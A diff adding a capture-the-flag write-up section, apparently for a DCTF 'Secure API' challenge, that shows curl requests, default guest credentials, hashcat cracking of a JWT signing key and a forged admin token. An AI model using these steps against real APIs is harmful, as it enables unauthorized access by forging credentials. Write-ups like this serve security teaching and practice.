@@ -24,6 +24,7 @@
 - [3. Web](#3-web)
     - [3.1 DevOps vs SecOps](#31-devops-vs-secops)
     - [3.2 Simple Web](#32-simple-web)
+    - [3.3 Secure API](#33-secure-api)
 - [4. Reverse Engineering](#4-Reverse-Engineering)
     - [4.1 Bell](#41-bell)
     - [4.2 Just In Time](#42-just-in-time)
@@ -1204,6 +1205,50 @@ On changing auth from `0` to `1` and sending the request, you will get the flag.
 $ curl "http://dctf1-chall-simple-web.westeurope.azurecontainer.io:8080/flag" --data "flag=1&auth=1&Submit=Submit"
 There you go: dctf{w3b_c4n_b3_fun_r1ght?}
 ```
+
+#### 3.3 Secure API
+On visiting the website, it shows an error message, saying Auth header not found, let's see if we can find an api route which can generate a token for us. On looking around we found `login` route which accepts `POST` request.
+
+```
+curl -X POST http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login
+```
+
+On sending the requests, it throws an error saying username and password field missing and looking on the first error message, we can probably guess username and password is `guest`. Let's send the request.
+
+```
+curl -X POST -d "username=guest&password=guest" http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080/login
+{"Token":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxNDQwMzk0fQ.E_pRzWEfzyP2FNz4nVr0yEXTrxxSTXAw4nyo1kyMxfY9lHPz8Tk8eyAAAz2ESr6ySPqqKZ72Qy1ZajlROY3ntA"}
+```
+
+Now we got our token, lets send this token to the default api route we found.
+
+```
+curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxNDQwMzk0fQ.E_pRzWEfzyP2FNz4nVr0yEXTrxxSTXAw4nyo1kyMxfY9lHPz8Tk8eyAAAz2ESr6ySPqqKZ72Qy1ZajlROY3ntA" http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080
+{"Message":"Hi, guest! You are not admin, I have no secret for you."
+```
+
+Looks like we need to be admin. Let's decode the json token first. All the juicy info in JWT is usually stored in second index if we conside whole jwt as an array.
+
+```
+echo "eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjIxNDQwMzk0fQ==" | base64 -d
+{"username":"guest","exp":1621440394}
+```
+
+Changing `guest` to `admin` will get the flag. But we can directy edit it, we need to find the code with which jwt was signed let's use hashcat for decrypting.
+
+```
+hashcat -a0 -m 16500 hash /usr/share/wordlists/rockyou.txt
+```
+
+This gives the password as `147852369`, just sign the jwt with this secret and send the request.
+
+```
+curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjIxNDQwMzk0fQ.i-gNZj1T9D4f0_iEnmtYXbp-G58ajb3OtmHNUYfyJPG3uTRrcnoVS080MPRsUjVD6qjS2jm_7Eqf6sDrhJLqaQ" http://dctf1-chall-secure-api.westeurope.azurecontainer.io:8080
+
+{"Message":"Hi, admin! I have a secret for you.","Secret":"dctf{w34k_k3y5_4r3_n0t_0k4y}"}
+```
+
+We got our flag xD.
 
 # 4. Reverse Engineering
 #### 4.1 Bell
